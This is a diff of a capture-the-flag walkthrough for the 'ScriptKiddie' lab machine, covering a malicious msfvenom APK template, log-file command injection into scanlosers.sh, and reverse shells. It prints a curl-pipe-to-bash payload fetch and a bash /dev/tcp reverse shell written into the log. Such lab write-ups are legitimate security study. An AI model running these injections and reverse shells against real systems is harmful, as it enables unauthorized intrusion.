@@ -55,24 +55,22 @@ It seems that using a "poisoned" or evil APK file as a template can result in co
 >*"An attacker who could trick an msfvenom user into using a crafted APK file as a template could execute arbitrary commands on the user's system.
 For example, an attacker could prepare and publish a crafted APK file that they believe is an enticing template. If a user of Metasploit Framework obtains that APK file and attempts to use it as an msfvenom template, arbitrary commands can be executed on that user's machine."*
 
-For this it seems the following criteria can result in a command injection vuln.
+For this it seems the following criteria can result in a command injection vuln:
 
-If a crafted APK file has a signature with an "Owner" field containing:
-- A single quote (to escape the single-quoted string)
-- Followed by shell metacharacters
+>*"If a crafted APK file has a signature with an "Owner" field containing A single quote (to escape the single-quoted string) followed by shell metacharacters."*
 
 
 
 
 <h2>Foothold</h2>
 
-We follow the instructions from the previously referenced Github page. Which involved downloading a python script to generate an "evil.apk" file, the script is described as: 
+We follow the instructions from the previously referenced Github page. Which involved downloading a python script to generate an "evil.apk" file, the script will: 
 
->*"The following Python script will produce a crafted APK file that executes a given command-line payload when used as a template."*
+>*"produce a crafted APK file that executes a given command-line payload when used as a template."*
 
 In this case we will be using it to execute a reverse shell on the box.
-We start our Netcat listener, set the target as Android on the website as APK files are Android files. We then we upload and catch the shell.
-Now we have a shell, we upgrade to a tty with `/usr/bin/script -qc /bin/bash /dev/null`. 
+We start our Netcat listener, set the target as Android on the website, we do this because APK files are Android Package files. 
+We then upload the APK and catch the shell. Now we have a shell, we upgrade to a tty with `/usr/bin/script -qc /bin/bash /dev/null`. 
 
 We find the user flag in `kid`'s home folder.
 
@@ -80,22 +78,22 @@ We find the user flag in `kid`'s home folder.
 I am way out of my depth here.
 
 According to the writeups it seems that lateral movement to another user is required.
-We see that there is a script called `scanlosers.sh` in a user called `pwn`'s home directory. Reading the script we see that it 
-reads rows from the `/home/kid/logs/hackers` file to read IP addresses and run nmap on them: We find the other logs in `./html`,
-a handy command is:
+We see that there is a script called `scanlosers.sh` in a user called `pwn`'s home directory. 
+Reading the script we see that it reads rows from the `/home/kid/logs/hackers` file to read IP addresses and run nmap on them: We find the other logs in `./html`, a handy command is:
 
 ```bash
 kid@scriptkiddie:~/html$ grep -R logs .
 grep -R logs .
 ./app.py:        with open('/home/kid/logs/hackers', 'a') as f:
 ```
-This searches files for the presence of logs.
+This searches recursively files for the presence of logs.
 
 We see that `app.py` writes to `/home/kid/logs/hackers.`
 
-Reading app.py we see that it writes to the logs directory when non-alphanumeric characters are input into the website's SearchSploit field. The writer assumes that submitted non-alpha characters represent an attempt to *"hacK"* them. So the script notes ip addresses of users who submit them in a log and run Nmap on them. 
+Reading app.py we see that it writes to the logs directory when non-alphanumeric characters are input into the website's SearchSploit field. 
+The writer assumes that submitted non-alpha characters represent an attempt to *"hacK"* them. So the script notes ip addresses of users who submit them in a log and run Nmap on them. 
 
-`scanlosers.sh` does not perform any input validation so we can perform "arbitrary OS command injection" by inputting our reverse shell in there. Ippsec does an excellent analysis of scanlosers.sh, after watching their video I now understand why our command would be executed.
+`scanlosers.sh` does not perform any input validation so we can perform "arbitrary OS command injection" by inputting our reverse shell in there. [Ippsec](https://youtu.be/Yn3iGF8xMQI?t=1979) does an excellent analysis of scanlosers.sh, after watching their video I now understand why our command would be executed.
 
 ```bash
 #!/bin/bash
@@ -119,18 +117,20 @@ Once the script determines what an ip is, it is then nmap'd by the command in th
 sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null"
 ```
 
-Ippsec points out that if the log file contains a string that has whatever for the initial two fields and then a semicolon, it would essentially nullify the first part of the command which is `nmap --top-ports 10 -oN recon/`. 
+Ippsec points out that if the log file contains a string that has whatever for the initial two fields and then a semicolon, it would essentially nullify the first part of the command which is `nmap --top-ports 10 -oN recon/$`. 
 
 Then a desired command can be placed in the third field, which is then ended with a hash(#) to comment out the rest of the command `.nmap ${ip} 2>&1 >/dev/null`. Their example is:
 
-```
-echo 'abc def ;curl 10.10.14.2:8000/rev.sh | bash #
+```bash
+echo 'abc def ;curl 10.10.14.2:8000/rev.sh | bash #' > hackers
 ```
 
 This would result in the initial and end part of the original command being nullified by `;` and `#`. As the first part is not a command so does not execute, then our command is read, and then the end of the original command is commented out.
 Our command would then be executed by `scanlosers.sh`, giving us a shell as `pwn` as `pwn` owns `scanlosers.sh`. 
 
-Putting our reverse shell into `/home/kid/logs/hackers.` with `echo 'a b $(bash -c "bash -i &>/dev/tcp/YOURIP/YOURPORT 0>&1")' > /home/kid/logs/hackers` gives us the reverse shell as pwn.
+Putting our reverse shell into `/home/kid/logs/hackers.` with: 
+`echo 'a b $(bash -c "bash -i &>/dev/tcp/YOURIP/YOURPORT 0>&1")' > /home/kid/logs/hackers` 
+gives us the reverse shell as pwn.
 
 <h2>Privilege Escalation</h2>
 
